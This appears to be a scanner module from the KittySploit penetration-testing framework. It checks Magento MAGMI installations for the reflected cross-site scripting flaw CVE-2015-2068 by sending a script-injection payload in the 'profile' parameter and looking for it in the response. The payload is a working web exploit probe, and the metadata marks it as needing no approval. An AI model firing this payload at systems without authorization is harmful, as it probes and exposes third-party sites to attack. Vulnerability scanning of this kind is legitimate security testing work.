#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Magento Server Mass Importer plugin contains multiple cross-site scripting vulnerabilities which allow remote ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Magento Server Mass Importer - Cross-Site Scripting Detection',
        'description': 'Magento Server Mass Importer plugin contains multiple cross-site scripting vulnerabilities which allow remote attackers to inject arbitrary web script or HTML via the (1) profile parameter to web/magmi.php or (2) QUERY_STRING to web/magmi_import_run.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'plugin', 'edb', 'packetstorm', 'magento', 'magmi', 'xss', 'magmi_project', 'magento_server', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/35996',
            'http://packetstormsecurity.com/files/130250/Magento-Server-MAGMI-Cross-Site-Scripting-Local-File-Inclusion.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2068',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-2068',
    }

    def run(self):
        r = self.http_request(method="GET", path='/magmi/web/magmi.php?configstep=2&profile=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Magento Server Mass Importer - Cross-Site Scripting detected",
                path='/magmi/web/magmi.php?configstep=2&profile=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

